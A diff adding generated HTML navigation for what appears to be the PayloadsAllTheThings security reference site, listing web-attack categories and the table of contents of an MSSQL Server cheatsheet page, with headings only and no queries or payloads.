+      <a href="../../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
+        MYSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
+        Oracle SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
+        PostgreSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
+        SQLite Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_38" type="checkbox" id="__nav_38" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_38">
+          Server Side Request Forgery
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Request Forgery" data-md-level="1">
+        <label class="md-nav__title" for="__nav_38">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Request Forgery
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Server%20Side%20Request%20Forgery/" class="md-nav__link">
+        Server-Side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_39" type="checkbox" id="__nav_39" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_39">
+          Server Side Template Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Template Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_39">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Template Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Server%20Side%20Template%20Injection/" class="md-nav__link">
+        Templates Injections
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_40" type="checkbox" id="__nav_40" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_40">
+          Tabnabbing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Tabnabbing" data-md-level="1">
+        <label class="md-nav__title" for="__nav_40">
+          <span class="md-nav__icon md-icon"></span>
+          Tabnabbing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tabnabbing/" class="md-nav__link">
+        Tabnabbing
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_41" type="checkbox" id="__nav_41" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_41">
+          Type Juggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Type Juggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_41">
+          <span class="md-nav__icon md-icon"></span>
+          Type Juggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Type%20Juggling/" class="md-nav__link">
+        PHP Juggling type and magic hashes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42" type="checkbox" id="__nav_42" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42">
+          Upload Insecure Files
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Upload Insecure Files" data-md-level="1">
+        <label class="md-nav__title" for="__nav_42">
+          <span class="md-nav__icon md-icon"></span>
+          Upload Insecure Files
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/" class="md-nav__link">
+        Upload
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_2" type="checkbox" id="__nav_42_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_2">
+          CVE Ffmpeg HLS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Ffmpeg HLS" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_2">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Ffmpeg HLS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
+        FFmpeg HLS vulnerability
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_3" type="checkbox" id="__nav_42_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_3">
+          Configuration Apache .htaccess
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Apache .htaccess" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_3">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Apache .htaccess
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
+        .htaccess upload
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_4" type="checkbox" id="__nav_42_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_4">
+          Configuration Busybox httpd.conf
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Busybox httpd.conf" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_4">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Busybox httpd.conf
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_5" type="checkbox" id="__nav_42_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_5">
+          Extension Flash
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Extension Flash" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_5">
+          <span class="md-nav__icon md-icon"></span>
+          Extension Flash
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_6" type="checkbox" id="__nav_42_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_6">
+          Picture Image Magik
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Picture Image Magik" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_6">
+          <span class="md-nav__icon md-icon"></span>
+          Picture Image Magik
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Picture%20Image%20Magik/" class="md-nav__link">
+        Image Tragik 1 & 2
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_7" type="checkbox" id="__nav_42_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_7">
+          Zip Slip
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Zip Slip" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_7">
+          <span class="md-nav__icon md-icon"></span>
+          Zip Slip
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
+        Zip Slip
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_43" type="checkbox" id="__nav_43" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_43">
+          Web Cache Deception
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Cache Deception" data-md-level="1">
+        <label class="md-nav__title" for="__nav_43">
+          <span class="md-nav__icon md-icon"></span>
+          Web Cache Deception
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Cache%20Deception/" class="md-nav__link">
+        Web Cache Deception Attack
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_44" type="checkbox" id="__nav_44" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_44">
+          Web Sockets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Sockets" data-md-level="1">
+        <label class="md-nav__title" for="__nav_44">
+          <span class="md-nav__icon md-icon"></span>
+          Web Sockets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Sockets/" class="md-nav__link">
+        Web Sockets Attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_45" type="checkbox" id="__nav_45" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_45">
+          XPATH Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XPATH Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_45">
+          <span class="md-nav__icon md-icon"></span>
+          XPATH Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XPATH%20Injection/" class="md-nav__link">
+        XPATH injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_46" type="checkbox" id="__nav_46" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_46">
+          XSLT Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSLT Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_46">
+          <span class="md-nav__icon md-icon"></span>
+          XSLT Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSLT%20Injection/" class="md-nav__link">
+        XSLT Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_47" type="checkbox" id="__nav_47" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_47">
+          XSS Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSS Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_47">
+          <span class="md-nav__icon md-icon"></span>
+          XSS Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/" class="md-nav__link">
+        Cross Site Scripting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
+        XSS in Angular and AngularJS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
+        XSS with Relative Path Overwrite - IE 8/9 and lower
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_48" type="checkbox" id="__nav_48" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48">
+          XXE Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XXE Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_48">
+          <span class="md-nav__icon md-icon"></span>
+          XXE Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XXE%20Injection/" class="md-nav__link">
+        XML External Entity
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_49" type="checkbox" id="__nav_49" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_49">
+           template vuln
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label=" template vuln" data-md-level="1">
+        <label class="md-nav__title" for="__nav_49">
+          <span class="md-nav__icon md-icon"></span>
+           template vuln
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../_template_vuln/" class="md-nav__link">
+        Vulnerability Title
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#identify-instances-and-databases" class="md-nav__link">
+    Identify Instances and Databases
+  </a>
+  
+    <nav class="md-nav" aria-label="Identify Instances and Databases">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discover-local-sql-server-instances" class="md-nav__link">
+    Discover Local SQL Server Instances
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discover-domain-sql-server-instances" class="md-nav__link">
+    Discover Domain SQL Server Instances
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discover-remote-sql-server-instances" class="md-nav__link">
+    Discover Remote SQL Server Instances
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identify-encrypted-databases" class="md-nav__link">
+    Identify Encrypted databases
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#version-query" class="md-nav__link">
+    Version Query
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#identify-sensitive-information" class="md-nav__link">
+    Identify Sensitive Information
+  </a>
+  
+    <nav class="md-nav" aria-label="Identify Sensitive Information">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-tables-from-a-specific-database" class="md-nav__link">
+    Get Tables from a Specific Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gather-5-entries-from-each-column" class="md-nav__link">
+    Gather 5 Entries from Each Column
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gather-5-entries-from-a-specific-table" class="md-nav__link">
+    Gather 5 Entries from a Specific Table
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dump-common-information-from-server-to-files" class="md-nav__link">
+    Dump common information from server to files
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#linked-database" class="md-nav__link">
+    Linked Database
+  </a>
+  
+    <nav class="md-nav" aria-label="Linked Database">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-trusted-link" class="md-nav__link">
+    Find Trusted Link
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#execute-query-through-the-link" class="md-nav__link">
+    Execute Query Through The Link
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crawl-links-for-instances-in-the-domain" class="md-nav__link">
+    Crawl Links for Instances in the Domain
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crawl-links-for-a-specific-instance" class="md-nav__link">
+    Crawl Links for a Specific Instance
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#query-version-of-linked-database" class="md-nav__link">
+    Query Version of Linked Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#execute-procedure-on-linked-database" class="md-nav__link">
+    Execute Procedure on Linked Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#determine-names-of-linked-databases" class="md-nav__link">
+    Determine Names of Linked Databases
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#determine-all-the-tables-names-from-a-selected-linked-database" class="md-nav__link">
+    Determine All the Tables Names from a Selected Linked Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gather-the-top-5-columns-from-a-selected-linked-table" class="md-nav__link">
+    Gather the Top 5 Columns from a Selected Linked Table
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gather-entries-from-a-selected-linked-column" class="md-nav__link">
+    Gather Entries from a Selected Linked Column
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-execution-via-xp_cmdshell" class="md-nav__link">
+    Command Execution via xp_cmdshell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extended-stored-procedure" class="md-nav__link">
+    Extended Stored Procedure
+  </a>
+  
+    <nav class="md-nav" aria-label="Extended Stored Procedure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures" class="md-nav__link">
+    Add the extended stored procedure and list extended stored procedures
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#clr-assemblies" class="md-nav__link">
+    CLR Assemblies
+  </a>
+  
+    <nav class="md-nav" aria-label="CLR Assemblies">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execute-commands-using-clr-assembly" class="md-nav__link">
+    Execute commands using CLR assembly
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manually-creating-a-clr-dll-and-importing-it" class="md-nav__link">
+    Manually creating a CLR DLL and importing it
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ole-automation" class="md-nav__link">
+    OLE Automation
+  </a>
+  
+    <nav class="md-nav" aria-label="OLE Automation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execute-commands-using-ole-automation-procedures" class="md-nav__link">
+    Execute commands using OLE automation procedures
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#agent-jobs" class="md-nav__link">
+    Agent Jobs
+  </a>
+  
+    <nav class="md-nav" aria-label="Agent Jobs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execute-commands-through-sql-agent-job-service" class="md-nav__link">
+    Execute commands through SQL Agent Job service
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-jobs" class="md-nav__link">
+    List All Jobs
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#external-scripts" class="md-nav__link">
+    External Scripts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    Python:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#r" class="md-nav__link">
+    R
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#audit-checks" class="md-nav__link">
+    Audit Checks
+  </a>
+  
+    <nav class="md-nav" aria-label="Audit Checks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-and-exploit-impersonation-opportunities" class="md-nav__link">
+    Find and exploit impersonation opportunities
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#find-databases-that-have-been-configured-as-trustworthy" class="md-nav__link">
+    Find databases that have been configured as trustworthy
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manual-sql-server-queries" class="md-nav__link">
+    Manual SQL Server Queries
+  </a>
+  
+    <nav class="md-nav" aria-label="Manual SQL Server Queries">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#query-current-user-determine-if-the-user-is-a-sysadmin" class="md-nav__link">
+    Query Current User &amp; determine if the user is a sysadmin
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#current-role" class="md-nav__link">
+    Current Role
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#current-db" class="md-nav__link">
+    Current DB
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-tables" class="md-nav__link">
+    List all tables
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-databases" class="md-nav__link">
+    List all databases
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#all-logins-on-server" class="md-nav__link">
+    All Logins on Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#all-database-users-for-a-database" class="md-nav__link">
+    All Database Users for a Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-sysadmins" class="md-nav__link">
+    List All Sysadmins
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-all-database-roles" class="md-nav__link">
+    List All Database Roles
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#effective-permissions-from-the-server" class="md-nav__link">
+    Effective Permissions from the Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#effective-permissions-from-the-database" class="md-nav__link">
+    Effective Permissions from the Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database" class="md-nav__link">
+    Find SQL Server Logins Which can be Impersonated for the Current Database
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-impersonation" class="md-nav__link">
+    Exploiting Impersonation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-nested-impersonation" class="md-nav__link">
+    Exploiting Nested Impersonation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mssql-accounts-and-hashes" class="md-nav__link">
+    MSSQL Accounts and Hashes
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/edit/master/Methodology and Resources/MSSQL Server - Cheatsheet.md" title="Edit this page" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="mssql-server">MSSQL Server</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#identifiy-instaces-and-databases">Identify Instances and Databases</a><ul>
+<li><a href="#discover-local-sql-server-instances">Discover Local SQL Server Instances</a></li>
+<li><a href="#discover-domain-sql-server-instances">Discover Domain SQL Server Instances</a></li>
+<li><a href="#discover-remote-sql-instances">Discover Remote SQL Server Instances</a></li>
+<li><a href="#identifiy-encrypted-databases">Identify Encrypted databases</a> </li>
+<li><a href="#version-query">Version Query</a></li>
+</ul>
+</li>
+<li><a href="#identify-sensitive-information">Identify Sensitive Information</a><ul>
+<li><a href="#get-tables-from-specific-databases">Get Tables from a Specific Database</a></li>
+<li><a href="#gather-5-entries-from-each-column">Gather 5 Entries from Each Column</a></li>
+<li><a href="#gather-5-entries-from-a-specific-table">Gather 5 Entries from a Specific Table</a></li>
+<li><a href="#dump-common-information-from-server-to-files">Dump common information from server to files</a></li>
+</ul>
+</li>
+<li><a href="#linked-database">Linked Database</a><ul>
+<li><a href="#find-trusted-link">Find Trusted Link</a></li>
+<li><a href="#execute-query-through-the-link">Execute Query Through The Link</a></li>
+<li><a href="#crawl-links-for-instances-in-the-domain">Crawl Links for Instances in the Domain</a> </li>
+<li><a href="#crawl-links-for-a-specific-instance">Crawl Links for a Specific Instance</a></li>
+<li><a href="#query-version-of-linked-database">Query Version of Linked Database</a></li>
+<li><a href="#execute-procedure-on-linked-database">Execute Procedure on Linked Database</a></li>
+<li><a href="#determine-names-of-linked-databases">Determine Names of Linked Databases </a></li>
+<li><a href="#determine-all-the-tables-names-from-a-selected-linked-database">Determine All the Tables Names from a Selected Linked Database</a></li>
+<li><a href="#gather-the-top-5-columns-from-a-selected-linked-table">Gather the Top 5 Columns from a Selected Linked Table</a></li>
+<li><a href="#gather-entries-from-a-selected-linked-column">Gather Entries from a Selected Linked Column</a></li>
+</ul>
+</li>
+<li><a href="#command-execution-via-xp_cmdshell">Command Execution via xp_cmdshell</a></li>
+<li><a href="#extended-stored-procedure">Extended Stored Procedure</a><ul>
+<li><a href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures">Add the extended stored procedure and list extended stored procedures</a></li>
+</ul>
+</li>
+<li><a href="#clr-assemblies">CLR Assemblies</a><ul>
